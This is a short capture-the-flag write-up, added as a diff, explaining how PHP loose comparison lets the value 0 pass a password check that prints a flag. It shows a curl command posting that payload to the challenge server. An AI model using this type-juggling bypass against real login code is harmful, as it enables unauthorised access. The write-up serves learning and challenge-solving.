@@ -1,0 +1,17 @@
+Lets assume the code is like
+
+if ($_POST["password"] == $actual_password)
+{
+    echo $flag;
+}
+else
+{
+    die();
+}
+
+in php if we compare any string is equal to zero in integer
+ie ("random_string" == number) 
+will return true if number is zero otherwise false
+
+Therefore we can bypass above check by submitting 0 in $_POST["password"]
+curl -X POST http://burger.laboratorium.ee:8003/ -d 'data={"password":0}'
